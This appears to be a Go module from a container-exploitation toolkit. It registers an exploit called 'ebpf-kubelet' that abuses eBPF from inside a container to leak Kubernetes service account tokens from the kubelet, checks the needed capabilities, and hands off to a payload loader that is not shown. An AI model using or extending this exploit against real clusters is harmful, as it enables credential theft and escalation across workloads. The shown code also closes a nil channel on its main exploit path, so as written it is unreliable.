package kubelet

import (
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v2"
)

var (
	aliases      = []string{"kubelet"}
	flagsExploit = []cli.Flag{}
	ExploitCmd   = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
	VulCmd       = app.Vul2VulCmd(&Vul, aliases, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "ebpf-kubelet",
		Description: "abuse eBPF to leak services account token from kubelet",
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.InContainer,
			Check:   exeenv.InContainer,
			Exploit: exeenv.InContainer,
		},
		CheckSecPrerequisites: prerequisite.Or(
			&capability.CapSysAdminBnd,
			&capability.CapBpfBnd,
		),
		ExploitablePrerequisites: prerequisite.Or(
			&capability.CapSysAdminEff,
			prerequisite.And(
				&capability.CapBpfEff,
				&capability.CapPerfmonEff,
			),
		),
	},
}

func (v *vulnerability) Exploit(context *cli.Context) (err error) {
	if err := v.BaseVulnerability.Exploit(context); err != nil {
		return err
	}
	return Exploit(nil)
}

func Exploit(c chan Event) (err error) {
	defer close(c)
	return Load(c)
}
